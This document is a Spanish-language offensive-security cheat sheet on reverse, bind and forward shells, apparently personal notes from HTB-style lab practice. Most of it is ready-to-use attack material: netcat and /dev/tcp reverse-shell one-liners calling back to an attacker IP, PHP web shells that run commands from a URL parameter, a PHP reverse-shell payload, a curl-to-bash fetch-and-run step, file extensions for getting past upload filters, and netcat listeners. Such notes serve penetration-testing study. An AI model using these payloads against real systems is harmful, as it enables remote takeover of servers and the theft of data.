# Diferentes tipos de ReverShell

Tags: #ReverShell #Comandos 

Tenemos diferentes tipos de Revershell este pagina Web:
* [Monkey-Pentester](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
* [Revershells](https://www.revshells.com/). 

**Reverse Shell**: Es una técnica que permite a un atacante conectarse a una máquina remota desde una máquina de su propiedad. Es decir, se establece una conexión desde la máquina comprometida hacia la máquina del atacante. Esto se logra ejecutando un programa malicioso o una instrucción específica en la máquina remota que establece la conexión de vuelta hacia la máquina del atacante, permitiéndole tomar el control de la máquina remota.

**Bind Shell**: Esta técnica es el opuesto de la Reverse Shell, ya que en lugar de que la máquina comprometida se conecte a la máquina del atacante, es el atacante quien se conecta a la máquina comprometida. El atacante escucha en un puerto determinado y la máquina comprometida acepta la conexión entrante en ese puerto. El atacante luego tiene acceso por consola a la máquina comprometida, lo que le permite tomar el control de la misma.

**Forward Shell**: Esta técnica se utiliza cuando no se pueden establecer conexiones Reverse o Bind debido a reglas de Firewall implementadas en la red. Se logra mediante el uso de **mkfifo**, que crea un archivo **FIFO** (**named pipe**), que se utiliza como una especie de “**consola simulada**” interactiva a través de la cual el atacante puede operar en la máquina remota. En lugar de establecer una conexión directa, el atacante redirige el tráfico a través del archivo **FIFO**, lo que permite la comunicación bidireccional con la máquina remota.

La mayoría de las paginas al momento de comprometerlas encontraremos el usuario **www-data** que es el encargado de gestionar la parte de servicios web.

```bash 
# Diferentes extensiones PHP para subir 'Shells' maliciosas

* php
* php3
* php4
* php5
* pht
* phtm
* phtml
* phar
```
## ReverShell, BindShell desde la URL de la Web

Este comando lo ejecutamos desde la pagina web para hacer una **ReverShell** : 
1) Cuando tenemos Netcat 
2) Cuando no tenemos Netcat
```bash 
# Para la Revershell en la URL de la web 

❯ nc -e /bin/bash IP 443
❯ bash -i >& /dev/tcp/IP/443 0>&1

	# Ip = Ip del atacante 

❯ bash -c "bash -i >& /dev/tcp/10.10.14.13/443 0>&1"

# Donde debemos de urlencodear el '&'
	& = %26
```

```bash
❯ nc -nlvp 443 -e /bin/bash              # Ejecutamos desde la pagina web para ponernos en escucha y hacer una BindShell
```

## ReverShell, BindShell cuando subes un archivo a la Web

Para ejecutar comandos en la Web debemos de crear o subir un archivo en el **/var/www/html** con el siguiente contenido: 
```php
❯ nano cmd.php

	<?php 
		echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
	?>
```
Las etiquetas que usamos ahí son **Pre** de preformateadas y nos sirven para que nos muestre bien el Output
Ya con ese archivo y que la Web interprete **php** podemos colocar en la url **?cmd=** y ahi pode colocar comandos y ver que Shell podriamos usar para conectarmos a nuestra maquina de **Atacante**.

```bash
❯ nano index.html
	#!/bin/bash
	bash -i >& /dev/tcp/10.10.14.2/443 0>&1

	# IP = IP de atacante
	# 443 = Puerto a usar

❯ curl ❮IP❯ | bash                     # Lo que hace Curl es obtener un index.html del servidor y despues con el bash haremos que nos interprete la data en bash
```

ReverShell en php
```php
<?php
   system("bash -c 'bash -i >& /dev/tcp/10.10.14.13/443 0>&1'")
?>

	# IP = IP de atacante
	# 443 = Puerto a usar
```

Para ponernos en escucha por Netcat en espera de la **ReverShell**:
1) Linux
2) Windows
```bash
❯ nc -nlvp 443 

❯ rlwrap nc -nlvp 443

	# nc = Netcat 
	# n = No DNS
	# l = Modo escucha, conexiones entrantes
	# v = verbose
	# p = numero local de puerto en esucha

```

Para ejecutar Netcat y hacer la **BindShell**: 
```bash
❯ nc IP-Victima 443
```

## ForwardShell

Para ejecutar comandos en la Web debemos de crear o subir un archivo en el **/var/www/html** con el siguiente contenido: 
```shell
❯ nano cmd.php
	<?php 
		echo shell_exec($_GET['cmd']);
	?>

```
Las etiquetas que usamos ahi son **Pre** de preformateadas y nos sirven para que nos muestre bien el Output
Ya con ese archivo y que la Web interprete **php** podemos colocar en la url **?cmd=** y ahí pode colocar comandos y conectarnos a nuestra maquina de **Atacante** por una **ForwardShell**

Descargaremos el siguiente archivo y lo ejecutaremos con Pyhton3 para hacer una **ForwardShell**: 
Debemos estar en la pestana de **Raw**
* [Tty_Over_Http](https://raw.githubusercontent.com/s4vitar/ttyoverhttp/master/tty_over_http.py)
```bash
❯ wget https://raw.githubusercontent.com/s4vitar/ttyoverhttp/master/tty_over_http.py

	# Descargarnos el archivo 'tty_over_html'
	# Cambiamos la parte de index.php por cmd.php (Dependiendo el servidor)

❯ python3 tty_over_http.py 
```

### Binario para Windows

Este .exe lo debemos de subir a la maquina victima en Windows
```bash
❯ /usr/share/Seclists/Web-Shells/FuzzDB/nc.exe           # Netcat .exe nos ayuda a conseguir una ReverShell en Windows
```